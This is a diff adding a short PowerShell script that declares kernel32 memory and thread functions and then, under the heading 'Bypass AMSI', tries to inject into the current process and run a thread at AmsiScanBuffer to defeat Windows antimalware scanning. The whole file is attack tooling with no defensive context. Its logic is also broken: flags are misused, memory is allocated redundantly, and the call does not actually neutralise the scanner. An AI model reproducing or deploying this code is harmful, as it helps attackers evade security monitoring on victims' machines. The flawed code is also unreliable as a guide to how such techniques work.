@@ -1,0 +1,40 @@
+# Define necessary constants
+$PROCESS_CREATE_THREAD = 0x0002
+$PROCESS_VM_OPERATION = 0x0008
+$PROCESS_VM_WRITE = 0x0020
+$PROCESS_VM_READ = 0x0010
+$PAGE_READWRITE = 0x04
+$PROCESS_QUERY_INFORMATION = 0x0400
+$PROCESS_ALL_ACCESS = 0x001F0FFF
+
+# Define necessary functions
+$Kernel32 = Add-Type -Name Kernel32 -Namespace Win32 -MemberDefinition @"
+[DllImport("kernel32.dll")]
+public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+[DllImport("kernel32.dll")]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("kernel32.dll")]
+public static extern bool CloseHandle(IntPtr hObject);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr LoadLibrary(string lpFileName);
+"@
+
+# Bypass AMSI
+$Script = [System.Text.Encoding]::Unicode.GetBytes([System.IO.File]::ReadAllText($MyInvocation.MyCommand.Path))
+$UnmanagedPointer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Script.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($Script, 0, $UnmanagedPointer, $Script.Length)
+$Kernel32::VirtualAllocEx.Invoke(-1, [IntPtr]::Zero, $Script.Length, $PAGE_READWRITE, $PAGE_READWRITE) | Out-Null
+$Kernel32::WriteProcessMemory.Invoke(-1, $Kernel32::VirtualAllocEx.Invoke(-1, [IntPtr]::Zero, $Script.Length, $PAGE_READWRITE, $PAGE_READWRITE), $Script, $Script.Length, [ref] 0) | Out-Null
+$Kernel32::CreateRemoteThread.Invoke(-1, [IntPtr]::Zero, 0, $Kernel32::GetProcAddress.Invoke($Kernel32::LoadLibrary.Invoke("amsi.dll"), "AmsiScanBuffer"), $Kernel32::VirtualAllocEx.Invoke(-1, [IntPtr]::Zero, $Script.Length, $PAGE_READWRITE, $PAGE_READWRITE), 0, [IntPtr]::Zero) | Out-Null
